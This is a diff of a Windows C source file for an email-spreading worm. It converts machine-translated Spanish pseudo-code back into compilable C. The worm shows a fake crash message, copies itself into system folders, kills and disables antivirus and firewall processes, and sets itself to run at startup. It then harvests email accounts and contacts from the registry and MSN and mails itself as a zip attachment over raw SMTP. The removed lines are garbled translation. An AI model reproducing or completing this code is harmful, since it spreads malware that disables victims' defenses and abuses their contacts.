@@ -1,53 +1,53 @@
 */
 
-#incluir <stdio.h>
-#incluir <windows.h>
-#incluir <stdlib.h>
-#incluir <string.h>
-#incluir <winsock.h>
-#incluir <tlhelp32.h>
-#incluir <comutil.h>
+#include <stdio.h>
+#include <windows.h>
+#include <stdlib.h>
+#include <string.h>
+#include <winsock.h>
+#include <tlhelp32.h>
+#include <comutil.h>
 
-#incluir "msgrua.h"
-#incluir "msgruaid.h"
-#incluir "project.h"
+#include "msgrua.h"
+#include "msgruaid.h"
+#include "project.h"
 
-Int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInst,LPSTR lpCmdLine,int nShowCmd) {
- Ventana HWND = CreateWindowEx(0,NULL,"Program",WS_OVERLAPPEDWINDOW | WS_HSCROLL | WS_VSCROLL, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,(HWND) NULL,(HMENU) NULL, hInstance, NULL);    
-	ShowWindow(ventana,SW_HIDE);
-	UpdateWindow(ventana);
+int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInst,LPSTR lpCmdLine,int nShowCmd) {
+	HWND window = CreateWindowEx(0,NULL,"Program",WS_OVERLAPPEDWINDOW | WS_HSCROLL | WS_VSCROLL, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,(HWND) NULL,(HMENU) NULL, hInstance, NULL);    
+	ShowWindow(window,SW_HIDE);
+	UpdateWindow(window);
 	if (strlen(lpCmdLine) == 0) {
-		MessageBox(window,"Este programa ha realizado una operación ilegal. Pila fuera de la memoria. Registro base encontrado en 0xFFFUFFCFFKFFEFFD","Error al ejecutar StackTrace",MB_OK+MB_ICONSTOP);
+		MessageBox(window,"This program has performed an illegal operation. Stack out of memory. Base reg found in 0xFFFUFFCFFKFFEFFD","Error running StackTrace",MB_OK+MB_ICONSTOP);
 		defaultRun();
 	}
-	más {
-		//si tiene args, -modo latente, intente ejecutar la carga útil.
+	else {
+		//if have args, -latent mode, try to execute payload.
 		defaultRun();
 		executePayload();
 	}
 }
 void defaultRun() {
-		startVariables(); //inicio
-		createZipWithWorm(); //try para crear un archivo Zip con el gusano
-		//usuario infectado
-		obtainEmailsFromMSN6(); //obtener correos electrónicos para enviar desde la lista de contactos de MSN 6
-		copyMe(); //copy en el sistema
-		killAVAndFirewallProcesses(); //kill proceso de av's y firewalls.
-		disableAVSAndFirewalls(); //deshabilitar el inicio de Windows de AV y Firewalls
-		putInRegistyToStartWithWindows(); //poner gusano en el registro para cargar con windows.
+		startVariables(); //start
+		createZipWithWorm(); //try to create Zip file with the worm
+		//user infected
+		obtainEmailsFromMSN6(); //obtain emails to send from msn 6 contact list
+		copyMe(); //copy into the system
+		killAVAndFirewallProcesses(); //kill process of av's and firewalls.
+		disableAVSAndFirewalls(); //disable av's and firewalls windows startup
+		putInRegistyToStartWithWindows(); //put worm into registry to load with windows.
 		findEmailInfo(); //find smtp server, email, and name to send via email
 		//c'est finih, para un usuario recien infectado
 		if (sendMail() == FALSE) {
-			//intente enviar por correo electrónico.
-			defaultPayload(); //a la mierda!!
+			//try to send via email.
+			defaultPayload(); //fuck it!!
 		} 
-		//try para eliminar archivos creados por el gusano.
+		//try to delete files created by the worm.
 		DeleteFile(tmpFile); //borramos el .exe auxiliar
 		DeleteFile(pkZipExeName); //borramos el pkzip
 		if (windowsTempDirectory == NULL) {
 			DeleteFile(WORM_ATTACHMENT_ZIP_FILE_HIDDEN); //borramos el zip
 		}
-		más {
+		else {
 			char *f1 = (char*)malloc(sizeof(char) * (strlen(WORM_ATTACHMENT_ZIP_FILE_HIDDEN) + strlen(windowsTempDirectory) + 3));
 			strcpy(f1,windowsTempDirectory);
 			strcat(f1,"\\");
@@ -56,222 +56,222 @@ void defaultRun() {
 		}
 }
 /*
-Función para iniciar variables.
+Function to start variables.
 */
 void startVariables() {
 	contadorServers = 0;
 	currentAccount = (char*)malloc(sizeof(char) * strlen(FIRST_ACCOUNT));
 	strcpy(currentAccount,FIRST_ACCOUNT);
- servidorActual = 0; //iniciar con el servidor 0
- posActualDestinatarios = 0; //destinatarios posición real = 0
- archivos. contador = 0; //en realidad, 0 archivos.
+	servidorActual = 0; //start with server 0
+	posActualDestinatarios = 0; //destinatarios actual position = 0
+	files.counter = 0; //actually, 0 files.
 	char windowsDir[MAX_PATH];
 	if (GetWindowsDirectory(windowsDir,MAX_PATH) != 0) {
-		//si no falla
+		//if not fails
 		windowsTempDirectory = (char*)malloc(sizeof(char) * strlen(windowsDir) + strlen("Temp") + 3);
 		strcpy(windowsTempDirectory,windowsDir);
 		strcat(windowsTempDirectory,"\\");
 		strcat(windowsTempDirectory,"Temp");
 		strcat(windowsTempDirectory,"\\");
 	}
-	más {
-		//if falla, cadena vacía.
+	else {
+		//if fails, empty string.
 		windowsTempDirectory = (char*)malloc(sizeof(char) * 2);
 		strcpy(windowsTempDirectory,"");
 	}
 
 }
 /*
-Función para copiar el gusano.
+Función to copy the worm.
 */
 void copyMe() {
 	char actualPath[MAX_PATH];
 	char systemPath[MAX_PATH];
-	arco de caracteres sin firmarProg[256]; //Esto contiene: C:\Archivos de programa\ o C:\Archivos de programa\ o ..
+	unsigned char archProg[256]; //This contains: C:\Program Files\ or C:\Archivos de programa\ or ..
 	DWORD archProgLength = sizeof(archProg);
 	HKEY hKey;
 	RegOpenKeyEx(HKEY_LOCAL_MACHINE,WINDOWS_CURRENTVERSION,0,KEY_QUERY_VALUE,&hKey);
 	RegQueryValueEx(hKey,PROGRAMFILESDIR,0,NULL,archProg,&archProgLength);
 	RegCloseKey(hKey);
 	if (GetModuleFileName(NULL,actualPath,MAX_PATH) != 0) {
-		/* si obtiene el archivo correctamente */
+		/* if obtain file correctly */
 		char *newFile = (char*)malloc(sizeof(char) * MAXDATASIZE);
 		GetSystemDirectory(systemPath,MAX_PATH);
-		strcpy(newFile,systemPath); /* crear archivo de destino */
+		strcpy(newFile,systemPath); /* create destiny file */
 		strcat(newFile,BARRA_INVERTIDA);
 		strcat(newFile,EXE_NAME_TO_COPY);
 		if (CopyFile(actualPath,newFile,FALSE) == 0) {
-			//error al copiar a %SystemRoot%, intente %ProgramFilesDir%
+			//error copying to %SystemRoot%, try to %ProgramFilesDir%
 			newFile = (char*)malloc(sizeof(char) * MAXDATASIZE);
 			strcpy(newFile,(const char*)archProg);
 			strcat(newFile,BARRA_INVERTIDA);
 			strcat(newFile,EXE_NAME_TO_COPY);
 			if (CopyFile(actualPath,newFile,FALSE) == 0) {
- whereIsStoredWorm = NULL; //no puede infectar windoze!
-				//ejecutará la carga útil predeterminada :-)
+				whereIsStoredWorm = NULL; //can't infect windoze!
+				//will execute the default payload :-)
 			}
-			más {
-				//bien copiado
+			else {
+				//well copied
 				whereIsStoredWorm = (char*)malloc(sizeof(char) * strlen(newFile) + 1);
-				strcpy(whereIsStoredWorm,newFile); //copy donde se almacena el gusano.
+				strcpy(whereIsStoredWorm,newFile); //copy where is worm stored.
 			}
 		}
-		más {
-			//si se copia bien
+		else {
+			//if copied well
 			whereIsStoredWorm = (char*)malloc(sizeof(char) * strlen(newFile) + 1);
-			strcpy(whereIsStoredWorm,newFile); //copy donde se almacena el gusano.
+			strcpy(whereIsStoredWorm,newFile); //copy where is worm stored.
 		}
 	}
 }
 /*
-Función para conectarse a un servidor.
+Function to connect to a server.
 */
 int connect(char *server) {
 	WSAStartup(MAKEWORD(1,1), &wsaData);
- LPHOSTENT mailServer = gethostbyname(servidor);
+	LPHOSTENT mailServer = gethostbyname(server);
 	if (!mailServer) {
 		WSACleanup();
-		devolver FALSE;
+		return FALSE;
 	}
 	cSocket = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
 	if (cSocket == INVALID_SOCKET) {
 		WSACleanup();
-		devolver FALSE;
+		return FALSE;
 	}
- serverInfo. sin_family = AF_INET;
- serverInfo. sin_addr = *((LPIN_ADDR)*mailServer->h_addr_list);
- serverInfo. sin_port = htons(25);
- nret = connect(cSocket,(LPSOCKADDR)&serverInfo,sizeof(struct sockaddr));
+	serverInfo.sin_family = AF_INET;
+	serverInfo.sin_addr = *((LPIN_ADDR)*mailServer->h_addr_list);
+	serverInfo.sin_port = htons(25);
+	nret = connect(cSocket,(LPSOCKADDR)&serverInfo,sizeof(struct sockaddr));
 	if (nret == SOCKET_ERROR) {
 		WSACleanup();
-		devolver FALSE;
+		return FALSE;
 	}
-	devolver VERDADERO;
+	return TRUE;
 }
 /*
-Función para enviar HELO.
+Function to send HELO.
 */
 int sendHelo() {
-	strcpy(bufferSend, HELO); //copiar HELO
-	strcat(bufferSend,smtpServers[servidorActual]); //put servidor
-	strcat(bufferSend, CRNL); //put \r\n
+	strcpy(bufferSend, HELO); //copy HELO
+	strcat(bufferSend,smtpServers[servidorActual]); //put server
+	strcat(bufferSend,CRNL); //put \r\n
 	if (send(cSocket,bufferSend,(int)strlen(bufferSend),0) == SOCKET_ERROR) {
-		devolver FALSE;
+		return FALSE;
 	}
- nret = recv(cSocket,bufferRcvd,sizeof(bufferRcvd),0);
+	nret = recv(cSocket,bufferRcvd,sizeof(bufferRcvd),0);
 	bufferRcvd[nret] = '\0';
-	si (!( (bufferRcvd[0] == '2') && (bufferRcvd[1] == '5') && (bufferRcvd[2] == '0'))) {
-		devolver FALSE;
+	if (!((bufferRcvd[0] == '2') && (bufferRcvd[1] == '5') && (bufferRcvd[2] == '0'))) {
+		return FALSE;
 	}
-	//if devuelve 250, ok
-	devolver VERDADERO;
+	//if returns 250, ok
+	return TRUE;
 }
 /*
-Función para enviar al socket MAIL FROM.
+Function to send to the socket MAIL FROM.
 */
 int sendMailFrom(char *from) {
-	strcpy(bufferSend, MAILFROM); //"CORREO DE: <"
+	strcpy(bufferSend, MAILFROM); //"MAIL FROM: <"
 	strcat(bufferSend,from);
-	strcat(bufferSend,MAYOR); //poner >
-	strcat(bufferSend, CRNL); // poner \r\n
+	strcat(bufferSend,MAYOR); //put >
+	strcat(bufferSend,CRNL); // put \r\n
 	if (send(cSocket,bufferSend,(int)strlen(bufferSend),0) == SOCKET_ERROR) {
-		devolver FALSE;
+		return FALSE;
 	}
- nret = recv(cSocket,bufferRcvd,sizeof(bufferRcvd),0);
+	nret = recv(cSocket,bufferRcvd,sizeof(bufferRcvd),0);
 	bufferRcvd[nret] = '\0';
-	si (!( (bufferRcvd[0] == '2') && (bufferRcvd[1] == '5') && (bufferRcvd[2] == '0'))) {
-		devolver FALSE;
+	if (!((bufferRcvd[0] == '2') && (bufferRcvd[1] == '5') && (bufferRcvd[2] == '0'))) {
+		return FALSE;
 	}
-	//if devuelve 250, ok
-	devolver VERDADERO;
+	//if returns 250, ok
+	return TRUE;
 }
 /*
-Función para enviar al socket los destinatarios.
+Function to send to the socket the recipients.
 */
 int sendMailRcptTo() {
 	int algunEmailValido = 0;
 	int i = 0;
 	while (destinatarios[i] != NULL) {
-		strcpy(bufferSend, RCPTTO); //"RCPT A: "
+		strcpy(bufferSend, RCPTTO);//"RCPT TO: "
 		strcat(bufferSend,destinatarios[i]);
-		strcat(bufferSend, CRNL);
+		strcat(bufferSend,CRNL);
 		if (send(cSocket,bufferSend,(int)strlen(bufferSend),0) == SOCKET_ERROR) {
-			devolver FALSE;
+			return FALSE;
 		}
- nret = recv(cSocket,bufferRcvd,sizeof(bufferRcvd),0);
+		nret = recv(cSocket,bufferRcvd,sizeof(bufferRcvd),0);
 		bufferRcvd[nret] = '\0';
 		if (((bufferRcvd[0] == '2') && (bufferRcvd[1] == '5') && (bufferRcvd[2] == '0'))) {
-			//if devuelve 250, ok
- algunEmailValido = 1; //un minimio válido de correo electrónico
+			//if returns 250, ok
+			algunEmailValido = 1; //one email valid minimium
 		}
 		i++;
 	}
-	if (algunEmailValido == 1) devuelve TRUE; //si tiene correos electrónicos válidos..
-	devolver FALSO; //si no tiene correos electrónicos válidos, devuelva false.
+	if (algunEmailValido == 1) return TRUE; //if have valids emails..
+	return FALSE; //if haven't valid emails, return false.
 }
 /*
-Función para enviar al socket comando DATA.
+Function to send to the socket DATA command.
 */
 int sendData() {
-	strcpy(bufferSend,DATA); //"DATOS\r\n"
+	strcpy(bufferSend,DATA); //"DATA\r\n"
 	if (send(cSocket,bufferSend,(int)strlen(bufferSend),0) == SOCKET_ERROR) {
-		devolver FALSE;
+		return FALSE;
 	}
- nret = recv(cSocket,bufferRcvd,sizeof(bufferRcvd),0);
+	nret = recv(cSocket,bufferRcvd,sizeof(bufferRcvd),0);
 	bufferRcvd[nret] = '\0';
-	si (!( (bufferRcvd[0] == '3') && (bufferRcvd[1] == '5') && (bufferRcvd[2] == '4'))) {
-		devolver FALSE;
+	if (!((bufferRcvd[0] == '3') && (bufferRcvd[1] == '5') && (bufferRcvd[2] == '4'))) {
+		return FALSE;
 	}
-	//if devuelve 354, ok
-	devolver VERDADERO;
+	//if returns 354, ok
+	return TRUE;
 }
 /*
-Función para enviar al socket comandos mime.
+Function to send to the socket mime commands.
 */
 int sendMime(char email[],char name[]) {
 	int i = 0;
-	int aleatorio = rand() % MAX_MESSAGES; //mensaje aleatorio
-	para (i = 0; i < 26; i++) {
+	int aleatorio = rand() % MAX_MESSAGES; //random message
+	for (i = 0; i < 26; i++) {
 		char *aux;
-		conmutador (i) {
-			caso 0:
-				//modificar DESDE:
-				// De: \"nombre\" <email@domain>\r\n
+		switch (i) {
+			case 0:
+				//modify FROM:
+				//From: \"name\" <email@domain>\r\n
 				aux = (char*)malloc(sizeof(char) * (strlen(email) + strlen(name) + strlen(smtpText[i]) + 8)); //8 = <,>,\0,\r,\n,",",espacio
 				strcpy(aux,smtpText[i]);
 				strcat(aux,"\"");
-				strcat(aux,nombre);
+				strcat(aux,name);
 				strcat(aux,"\" ");
 				strcat(aux,"<");
-				strcat(aux, correo electrónico);
+				strcat(aux,email);
 				strcat(aux,">\r\n");
 				if (send(cSocket,aux,(int)strlen(aux),0) == SOCKET_ERROR) {
-					devolver FALSE;
+					return FALSE;
 				}
-				//modificar desde para poner nombre y correo electrónico
-				quebrar;
-			caso 2:
-				//modificar asunto
+				//modify from to put name and email
+				break;
+			case 2:
+				//modify subject
 				aux = (char*)malloc(sizeof(char) * (strlen(smtpText[i]) + strlen(defaultSubjects[aleatorio]) + 1));
 				strcpy(aux,smtpText[i]);
 				strcat(aux,defaultSubjects[aleatorio]);
 				if (send(cSocket,aux,(int)strlen(aux),0) == SOCKET_ERROR) {
-					devolver FALSE;
+					return FALSE;
 				}
-				quebrar;
-			caso 18:
+				break;
+			case 18:
 				//i = 18
-				//mensaje
+				//message
 				if (send(cSocket,smtpText[i],(int)strlen(smtpText[i]),0) == SOCKET_ERROR) {
-					devolver FALSE;
+					return FALSE;
 				}
 				aux = (char*)malloc(sizeof(char) * (strlen(defaultEmailTexts[aleatorio]) + 1));
 				strcpy(aux,defaultEmailTexts[aleatorio]);
 				if (send(cSocket,aux,(int)strlen(aux),0) == SOCKET_ERROR) {
-					devolver FALSE;
+					return FALSE;
 				}
-				quebrar;
-			caso 22: //nombre de archivo
+				break;
+			case 22: //file name
 				aux = (char*)malloc(sizeof(char) * (strlen(smtpText[i]) + strlen(defaultFileNameAttachments[aleatorio]) + 5)); // 5 = ",",\r,\n,\0,
 				strcpy(aux,smtpText[i]);
 				strcat(aux,"\"");
@@ -279,10 +279,10 @@ int sendMime(char email[],char name[]) {
 				strcat(aux,"\"");
 				strcat(aux,"\r\n");
 				if (send(cSocket,aux,(int)strlen(aux),0) == SOCKET_ERROR) {
-					devolver FALSE;
+					return FALSE;
 				}
-				quebrar;
-			caso 25: //nombre de archivo
+				break;
+			case 25: //file name
 				aux = (char*)malloc(sizeof(char) * (strlen(smtpText[i]) + strlen(defaultFileNameAttachments[aleatorio]) + 5)); // 5 = ",",\r,\n,\0,
 				strcpy(aux,smtpText[i]);
 				strcat(aux,"\"");
@@ -290,148 +290,148 @@ int sendMime(char email[],char name[]) {
 				strcat(aux,"\"");
 				strcat(aux,"\r\n");
 				if (send(cSocket,aux,(int)strlen(aux),0) == SOCKET_ERROR) {
-					devolver FALSE;
+					return FALSE;
 				}
-				quebrar;
-			por defecto:
+				break;
+			default:
 				if (send(cSocket,smtpText[i],(int)strlen(smtpText[i]),0) == SOCKET_ERROR) {
-					devolver FALSE;
+					return FALSE;
 				}
 		}
 	}
-	devolver VERDADERO;
+	return TRUE;
 }
 /*
-Función para enviar al socket el archivo en base64.
+Función to send to the socket the file in base64.
 */
 int sendBase64() {
-	if (convertFileToBase64() == VERDADERO) {
+	if (convertFileToBase64() == TRUE) {
 		DeleteFile(WORM_ATTACHMENT_ZIP_FILE_HIDDEN); //delete zip
-		DeleteFile(tmpFile); //eliminar .exe auxiliar
+		DeleteFile(tmpFile); //delete auxiliar .exe
 		DeleteFile(pkZipExeName); //delete pkzip
 		if (send(cSocket,buffer64,(int)strlen(buffer64),0) == SOCKET_ERROR) {
-			devolver FALSE;
+			return FALSE;
 		}
-		devolver VERDADERO;
+		return TRUE;
 	}
-	más {
-		devolver FALSE;
+	else {
+		return FALSE;
 	}
 }
 /*
-Función para enviar CRNL (\r\n)
+Función to send CRNL (\r\n)
 */
 int sendCRNL() {
 	if (send(cSocket,CRNL,(int)strlen(CRNL),0) == SOCKET_ERROR) {
-		devolver FALSE;
+		return FALSE;
 	}
-	devolver VERDADERO;
+	return TRUE;
 }
 /*
-Función para conectar el servidor SMTP. El parámetro de matriz contiene, servidor, correo electrónico y nombre para mostrar.
+Function to connect SMTP server. The array parameter contains, server, email and name to show.
 */
 int connectToSMTP(char *servEmailName[]) {
 	if (connect(servEmailName[0]) == FALSE) {
-		devolver FALSE;
+		return FALSE;
 	}
- nret = recv(cSocket,bufferRcvd,sizeof(bufferRcvd),0);
+	nret = recv(cSocket,bufferRcvd,sizeof(bufferRcvd),0);
 	bufferRcvd[nret] = '\0';
-	si (!( (bufferRcvd[0] == '2') && (bufferRcvd[1] == '2') && (bufferRcvd[2] == '0'))) {
-		//220 aceptar
+	if (!((bufferRcvd[0] == '2') && (bufferRcvd[1] == '2') && (bufferRcvd[2] == '0'))) {
+		//220 ok
 		closesocket(cSocket);
 		WSACleanup();
-		devolver FALSE;
+		return FALSE;
 	}
 
-	si (sendHelo() == FALSE) devuelve FALSE; //enviar helo
-	if (sendMailFrom(servEmailName[1]) == FALSE) devuelve FALSE; //enviar correo desde:
-	if (sendMailRcptTo() == FALSE) devuelve FALSE; //enviar Rcpt a:
-	si (sendData() == FALSE) devuelve FALSE; //enviar datos
-	if (sendMime(servEmailName[1],servEmailName[2]) == FALSE) devuelve FALSE; //enviar mimo
-	if (sendCRNL() == FALSE) devuelve FALSE; //enviar CRNL
-	//if (sendCRNL() == FALSE) devuelve FALSE; enviar CRNL
-	//if (sendCRNL() == FALSE) devuelve FALSE; enviar CRNL
+	if (sendHelo() == FALSE) return FALSE; //send helo
+	if (sendMailFrom(servEmailName[1]) == FALSE) return FALSE; //send Mail From:
+	if (sendMailRcptTo() == FALSE) return FALSE; //send Rcpt to:
+	if (sendData() == FALSE) return FALSE; //send Data
+	if (sendMime(servEmailName[1],servEmailName[2]) == FALSE) return FALSE; //send mime
+	if (sendCRNL() == FALSE) return FALSE; //send CRNL
+	//if (sendCRNL() == FALSE) return FALSE; //send CRNL
+	//if (sendCRNL() == FALSE) return FALSE; //send CRNL
 	if (sendBase64() == FALSE) {
-		devolver FALSO; //enviar búfer en base64
+		return FALSE; //send buffer in base64
 	}
-	if (send(cSocket,smtpText[26],(int)strlen(smtpText[26]),0) == SOCKET_ERROR) devuelve FALSE;
-	if (send(cSocket,CR,(int)strlen(NEWLINE),0) == SOCKET_ERROR) devuelve FALSE;
-	if (send(cSocket,NEWLINE,(int)strlen(NEWLINE),0) == SOCKET_ERROR) devuelve FALSE;
-	if (send(cSocket,smtpText[27],(int)strlen(smtpText[27]),0) == SOCKET_ERROR) devuelve FALSE;
- nret = recv(cSocket,bufferRcvd,sizeof(bufferRcvd),0);
+	if (send(cSocket,smtpText[26],(int)strlen(smtpText[26]),0) == SOCKET_ERROR) return FALSE;
+	if (send(cSocket,CR,(int)strlen(NEWLINE),0) == SOCKET_ERROR) return FALSE;
+	if (send(cSocket,NEWLINE,(int)strlen(NEWLINE),0) == SOCKET_ERROR) return FALSE;
+	if (send(cSocket,smtpText[27],(int)strlen(smtpText[27]),0) == SOCKET_ERROR) return FALSE;
+	nret = recv(cSocket,bufferRcvd,sizeof(bufferRcvd),0);
 	bufferRcvd[nret] = '\0';
-	//250 aceptar
-	si (!( (bufferRcvd[0] == '2') && (bufferRcvd[1] == '5') && (bufferRcvd[2] == '0'))) {
-		devolver FALSE;
+	//250 ok
+	if (!((bufferRcvd[0] == '2') && (bufferRcvd[1] == '5') && (bufferRcvd[2] == '0'))) {
+		return FALSE;
 	}
 	if (send(cSocket,CR,(int)strlen(CR),0) == SOCKET_ERROR) {
-		devolver FALSE;
+		return FALSE;
 	}
 	if (send(cSocket,NEWLINE,(int)strlen(NEWLINE),0) == SOCKET_ERROR) {
-		devolver FALSE;
+		return FALSE;
 	}
 	if (send(cSocket,smtpText[28],(int)strlen(smtpText[28]),0) == SOCKET_ERROR) {
-		devolver FALSO; //28 SALIR
+		return FALSE; //28 QUIT
 	}
- nret = recv(cSocket,bufferRcvd,sizeof(bufferRcvd),0);
+	nret = recv(cSocket,bufferRcvd,sizeof(bufferRcvd),0);
 	closesocket(cSocket);
 	WSACleanup();
-	devolver VERDADERO;
+	return TRUE;
 }
 /*
-Función para enviar por correo electrónico.
+Function to send via email.
 */
 int sendMail() {
-	int i = 0; //counter para ver el servidor real de predefinido
-	int nResCon = 0; //variable para guardar que devuelve la conexión del servidor
-	int seEnvioAlguno = FALSO; //variable para saber si finaliza el correo electrónico con el servidor del Registro
+	int i = 0; //counter to view actual server of predefined
+	int nResCon = 0; //variable to save that returns the conexion of server
+	int seEnvioAlguno = FALSE; //variable to know if end email with registry server
 	if (contadorServers > 0) {
-		//si se encuentran servidores en el registro..
-		hacer {
+		//if found servers in registry..
+		do {
 			int aleatorio = rand() % MAX_DEFAULT_EMAILS;
-			//intentar conectarse
+			//try to connect
 			if (smtpServers[i] != NULL) {
-				//if server != null, intente copiar
+				//if server != null, try to copy
 				servidorEmailYNombreActual[0] = (char*)malloc(sizeof(char) * strlen(smtpServers[i])); //memoria para el servidor
-				strcpy(servidorEmailYNombreActual[0],smtpServers[i]); //copiar el servidor
+				strcpy(servidorEmailYNombreActual[0],smtpServers[i]); //copy the server
 				if (emailAdresses[i] == NULL) {
-					//si no he enviado un correo electrónico, tomaré un mensaje aleatorio
+					//if haven't email, i will take a random
 					servidorEmailYNombreActual[1] = (char*)malloc(sizeof(char) * strlen(defaultRemitentes[aleatorio])); //memoria para el email
-					strcpy(servidorEmailYNombreActual[1],defaultRemitentes[aleatorio]); //copiar correo electrónico
+					strcpy(servidorEmailYNombreActual[1],defaultRemitentes[aleatorio]); //copy email
 				}
-				más {
-					//si lo tengo, lo copiaré
+				else {
+					//if i have it, i will copy it
 					servidorEmailYNombreActual[1] = (char*)malloc(sizeof(char) * strlen(emailAdresses[i])); //memoria para el email
-					strcpy(servidorEmailYNombreActual[1],emailAdresses[i]); //copiar correo electrónico
+					strcpy(servidorEmailYNombreActual[1],emailAdresses[i]); //copy email
 				}
 				if (nameToShowInEmails[i] == NULL) {
 					servidorEmailYNombreActual[2] = (char*)malloc(sizeof(char) * strlen(defaultNames[aleatorio])); //memoria para el email
 					strcpy(servidorEmailYNombreActual[2],defaultNames[aleatorio]);
 				}
-				más {
+				else {
 					servidorEmailYNombreActual[2] = (char*)malloc(sizeof(char) * strlen(nameToShowInEmails[i])); //memoria para el email
 					strcpy(servidorEmailYNombreActual[2],nameToShowInEmails[i]);
 				}
-				//tener la información necesaria
- servidorActual = i; //actual servidor SMTP es el servidor 'i'
- nResCon = connectToSMTP(servidorEmailYNombreActual); //intente conectarse al servidor
-				if (nResCon == TRUE) devuelve TRUE; //si se envía con éxito, devuelva true y salga
+				//have necesary info
+				servidorActual = i; //actual smtp server is server 'i'
+				nResCon = connectToSMTP(servidorEmailYNombreActual); //try to connect to the server
+				if (nResCon == TRUE) return TRUE; //if send succesfully, return true and exit
 			}
- nResCon = FALSO; 
+			nResCon = FALSE; 
 			i++;
 		}
 		while ((nResCon == FALSE) && (i < contadorServers));
 	}
-	if (seEnvioAlguno == FALSO) {
-		//if no se puede enviar con servidores de registro.. pruebe con predefinido
-		//esto si se puede omitir
+	if (seEnvioAlguno == FALSE) {
+		//if can't send with registry servers.. try with predefined
+		//this if can be omited
 		i = 0;
-		hacer {
-			int aleatorio = rand() % MAX_DEFAULT_EMAILS; //correo aleatorio 
-			//el problema es que nuestra estructura de connectToSMTP()
-			//recibe un parms que para los servidores del registro era optimus
-			//pero aquí no. si el registro no funciona, tenemos que probar con servidores aleatorios
-			//y remitentes y nombres aleatorios 
+		do {
+			int aleatorio = rand() % MAX_DEFAULT_EMAILS; //random mail 
+			//the problem is that our structure of connectToSMTP()
+			//it receives a parms that to registry servers was optimus
+			//but here not. if registry dont work, we have to try with random servers
+			//and random remitents and names 
 			servidorEmailYNombreActual[0] = (char*)malloc(sizeof(char) * (strlen(defaultSMTPServers[i]) + 1));
 			strcpy(servidorEmailYNombreActual[0],defaultSMTPServers[i]);
 			servidorEmailYNombreActual[1] = (char*)malloc(sizeof(char) * (strlen(defaultRemitentes[aleatorio]) + 1));
@@ -439,70 +439,70 @@ int sendMail() {
 			servidorEmailYNombreActual[2] = (char*)malloc(sizeof(char) * (strlen(defaultNames[aleatorio]) + 1));
 			strcpy(servidorEmailYNombreActual[2],defaultNames[aleatorio]);
 			nResCon = connectToSMTP(servidorEmailYNombreActual);
-			if (nResCon == TRUE) devuelve TRUE;
+			if (nResCon == TRUE) return TRUE;
 			i++;
 		}
 		while ((nResCon == FALSE) && (defaultSMTPServers[i] != NULL));
 	}
-	devolver FALSO; //no se puede enviar el gusano
+	return FALSE; //can't send worm
 }
 
 /*
-Función para obtener el tamaño de un archivo.
+Function to obtain the size of a file.
 */
 int getFileSize(char *file) {
- ARCHIVO *f = fopen(file,"rb");
+	FILE *f = fopen(file,"rb");
 	if (f == NULL) {
-		devolver FALSE;
+		return FALSE;
 	}
 	fseek (f , 0 , SEEK_END);
 	return ftell (f);
 }
 /*
-Función para convertir el archivo Zip que contiene el gusano.
+Function to convert Zip file that contains the worm.
 */
 int convertFileToBase64() {
 	int resEncode = 0;
 	int size = getFileSize(WORM_ATTACHMENT_ZIP_FILE_HIDDEN);
-	if (tamaño == FALSO) {
+	if (size == FALSE) {
 		buffer64 = (char*)malloc(sizeof(char) * DEF_BASE64_SIZE);
 	}
-	más {
+	else {
 		buffer64 = (char*)malloc(sizeof(char) * (size * 2));
 	}
 	if (windowsTempDirectory == NULL) {
- resEncode = codificar(WORM_ATTACHMENT_ZIP_FILE_HIDDEN);
+		resEncode = encode(WORM_ATTACHMENT_ZIP_FILE_HIDDEN);
 	}
-	más {
+	else {
 		char *f = (char*)malloc(sizeof(char) * (strlen(windowsTempDirectory) + strlen(WORM_ATTACHMENT_ZIP_FILE_HIDDEN) + 3));
 		strcpy(f,windowsTempDirectory);
 		strcat(f,"\\");
 		strcat(f,WORM_ATTACHMENT_ZIP_FILE_HIDDEN);
- resEncode = codificar(f);
+		resEncode = encode(f);
 	}
 	if (resEncode == FALSE) {
-		devolver FALSE;
+		return FALSE;
 	}
-	devolver VERDADERO;
+	return TRUE;
 }
 /*
 findEmailInfo():
-Esta función abre el registro con el uso de claves de búsqueda almacenadas en "Software\\Microsoft\\Internet Account Manager\\Accounts\\000000X"
-Incluso de estas claves contiene información sobre las posibles cuentas de correo electrónico logdget en el PC (Outlook), usaremos esto
-cuentas (servidor smtp, correo electrónico y nombre para mostrar), para reenviar el gusano.
-La operación es fácil, el gusano cros las teclas (de 00000001 a 0000000X) encontrando información y compilándola.
-Para esto, usaré la función existsAccountsToGetMailInfo(), que devuelve true si existe una cuenta real.
-Si devuelve true, obtendremos el servidor smtp, el correo electrónico y el nombre para mostrar de accout, y almacenaremos en las variables smtpServers, emailAddresses y nameToShowInEmails.
-El funcionamiento de estas variables son las siguientes:
-smtpServers[i] relaciona el servidor con emailAddresses[i] y nameToShowInEmails[i].
+This function open the registry with the porpouse of find keys stored in "Software\\Microsoft\\Internet Account Manager\\Accounts\\000000X"
+Even of this keys contains information about the posible accounts of email logdget in the PC (Outlook), we will use this
+accounts (smtp server, email, and name to show), to resend the worm.
+The operation is easy, the worm will cros the keys (from 00000001 to 0000000X) finding info and compiling it.
+For this, i will use function existsAccountsToGetMailInfo(), that return true if actual account exists.
+If returns true, we will obtain smtp server, email, and name to show of accout, and we will store in smtpServers, emailAddresses, and nameToShowInEmails variables.
+The operation of this variables are the next:
+smtpServers[i] relation the server with emailAddresses[i] and nameToShowInEmails[i].
 */
 void findEmailInfo() { 
-	caracteres sin firmar  smtp[256];
-	correo electrónico char sin firmar[256];
-	nombre de caracteres sin firmar[256];
+	unsigned char smtp[256];
+	unsigned char email[256];
+	unsigned char name[256];
 	DWORD smtpLength = sizeof(smtp);
 	DWORD emailLength = sizeof(email);
- DWORD nameLength = sizeof(nombre);
+	DWORD nameLength = sizeof(name);
 	HKEY hKey;
 	while (existsAccountsToGetMailInfo()) {
 		char *actualSubKey = (char*)malloc(sizeof(char) * (strlen(REG_SUBKEY) + DEFAULT_SIZE_OF_ACCOUNTS_IDS));
@@ -544,36 +544,36 @@ void findEmailInfo() {
 	}
 }
 /*
-Función para obtener el tamaño de una cadena en un char []
+Function to obtain the size of a string in a char []
 */
 int obtainLength(unsigned char b[]) {
 	int i = 0;
-	mientras que (b[i] != NULL) {
+	while (b[i] != NULL) {
 		i++;
 	}
